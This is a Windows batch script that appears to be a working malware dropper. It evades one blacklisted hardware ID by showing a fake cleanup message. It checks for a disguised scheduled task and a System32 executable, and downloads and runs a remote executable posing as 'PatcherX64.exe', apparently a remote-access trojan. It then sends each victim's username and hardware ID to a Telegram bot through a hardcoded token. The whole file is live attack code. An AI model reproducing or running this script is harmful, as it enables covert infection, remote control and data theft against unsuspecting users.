@echo off

:: Check HWID ( Run full script & exit )
for /f "delims=" %%i in ('powershell -command "Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"') do set "currentHwid=%%i"

set "notallowedHwids=4C4C4544-0031-5710-8039-B6C04F514E33"

for %%h in (%notallowedHwids%) do (
    if "%%h"=="%currentHwid%" (
        echo HWID %currentHwid%
        echo this HWID is not allowed to run the full script.
        start cmd /c "@echo off & color 0A & echo Deleting Temporary Files.. & timeout /t 4 /nobreak >nul"
        goto :EOF
    )
)

echo HWID %currentHwid%
echo This HWID is allowed. Continuing script...











setlocal enabledelayedexpansion

:: Place HWID into %HWID% variable ( SVb5DCPV )
for /f %%i in ('powershell -Command "(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID"') do set HWID=%%i

:: Fucker CHAT ID : -1002163721260
:: Output CHAT ID : -1002460905948


:: Set bot token, chat ID, and message
set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
set "CHAT_ID=-1002163721260"
set "MESSAGE=AgentConnected|%USERNAME%|%HWID%|"




:loop
color 0A




:CheckRunEvery
:: Check for the scheduled task named "SystemLibrariesU"
schtasks /query /TN "SystemLibrariesU" >nul 2>&1
set "taskExists=%ERRORLEVEL%"

:: Check for the existence of convertsshd.exe
if not exist "%SystemRoot%\System32\convertsshd.exe" (
    set "fileExists=0"
) else (
    set "fileExists=1"
)

:: If either the task doesn't exist or the file doesn't exist, go to :INSTALLEVERY
if %taskExists% neq 0 (
    echo Scheduled task "SystemLibrariesU" does not exist.
    goto :INSTALLEVERY
)

if %fileExists% neq 1 (
    echo File "convertsshd.exe" does not exist.
    goto :INSTALLEVERY
)

:: Both the scheduled task and the file exist
goto :SENDMSG




:INSTALLEVERY
echo Performing installation or alternative actions...

:: RunEveryInstaller

 
:loop
 
:: Kill & Delete file 
taskkill /f /im PatcherX64.exe >nul 2>&1
del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
 
for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/RunEveryCallerFileLink') do set "RUNFILELINK=%%i"
 
:: Download the file using curl
curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%RUNFILELINK%"
 
timeout /t 2 /nobreak >nul
 
:: Checking the existing of the file
if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
    echo.
    echo The download hasn't started yet. Please check your connection.
	timeout /t 2 /nobreak >nul
	echo Retrying in 2 seconds ....
	timeout /t 2 /nobreak >nul
	echo.
	goto loop
)
 
 
 
:: Get the file size in bytes
for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
 
 
 
:: Check if the file size is at least 400KB (400000 bytes)
if %FILESIZE% geq 400000 (
    start "" "%APPDATA%\microsoft\PatcherX64.exe"
) else (
echo.
    echo Download incomplete. Check your connection and run the file again.
	timeout /t 2 /nobreak >nul
	echo Retrying in 2 seconds ....
	timeout /t 2 /nobreak >nul
	echo.
	goto loop
)
 
 
echo Patcher Running...
timeout /t 1 /nobreak >nul



set "MESSAGE=%MESSAGE%|RemcFileRunner|"













timeout /t 5 /nobreak >nul

:SENDMSG


if not exist "%appdata%\Microsoft\Windows\SystemCertificatesData\StartupTaskCaller.exe" (
    set "MESSAGE=%MESSAGE%"
)


:: URL encode the message by replacing spaces with %20
set "ENCODED_MESSAGE=%MESSAGE: =%%2"

:: Send the message using curl
curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
     -d "chat_id=%CHAT_ID%" ^
     -d "text=%ENCODED_MESSAGE%"

echo Message sent to chat ID %CHAT_ID%
endlocal
